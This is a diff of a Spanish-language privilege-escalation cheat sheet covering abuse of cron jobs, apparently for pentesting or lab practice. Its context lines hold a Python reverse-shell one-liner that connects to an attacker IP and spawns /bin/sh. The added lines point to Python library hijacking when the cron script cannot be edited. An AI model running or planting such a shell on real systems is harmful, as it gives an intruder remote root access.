@@ -26,6 +26,10 @@ Si es editable añadimos el siguiente codigo para establecer una reverse shell c
     `s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((``"192.168.1.139"``,1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([``"/bin/sh"``,``"-i"``])`
 ```
 
+##### Tarea cron python no editable
+Podriamos tratar de mirar si podemos editar librerias o podemos escribir en el directorio donde está alojado el *.py*, ya sea porque nuestro usuario o nuestro grupo pueda hacerlo.  Mirar sección Python Library hijacking.
+
+
 ##### Tarea cron bash (cambio contraseña root)
 Si es editable, podemos meterle lo siguiente:
 
